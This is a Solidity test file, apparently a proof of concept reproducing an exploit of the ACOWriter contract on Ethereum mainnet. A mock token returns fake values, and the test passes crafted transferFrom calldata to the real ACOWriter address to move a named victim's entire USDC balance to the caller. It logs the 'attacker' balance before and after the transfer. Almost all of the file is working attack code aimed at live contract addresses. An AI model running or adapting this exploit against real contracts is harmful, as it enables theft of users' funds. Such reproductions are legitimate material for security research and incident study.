// SPDX-License-Identifier: UNLICENSED
// !! THIS FILE WAS AUTOGENERATED BY abi-to-sol v0.5.3. SEE SOURCE BELOW. !!
pragma solidity >=0.7.0 <0.9.0;

import "ds-test/test.sol";
import "./interface.sol";

contract MockACOToken {
    function collateral() public view returns(address) {
        return address(0);
    }

    function mintToPayable(address account) external payable returns(uint256) {
        return 1;
    }

    function balanceOf(address account) public view returns(uint256) {
        return 1;
    }

    function approve(address spender, uint256 amount) public returns(bool) {
        return true;
    }

    function strikeAsset() public view returns(address) {
        return address(this);
    }

    function transfer(address recipient, uint256 amount) public returns(bool) {
        return true;
    }
}

contract ContractTest is DSTest, MockACOToken {

    IACOWriter acowrite = IACOWriter(payable(0xE7597F774fD0a15A617894dc39d45A28B97AFa4f));
    IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    

    function test() public{
        emit log_named_uint("Before exploit, USDC balance of attacker:",usdc.balanceOf(msg.sender));
       acowrite.write{value: 1 }(address(this),1,address(usdc),abi.encodeWithSelector(bytes4(keccak256(bytes("transferFrom(address,address,uint256)"))), 0xCB32033c498b54818e58270F341e5f6a3bce993B, msg.sender, usdc.balanceOf(0xCB32033c498b54818e58270F341e5f6a3bce993B)));
          emit log_named_uint("After exploit, USDC balance of attacker:",usdc.balanceOf(msg.sender));
    }

}
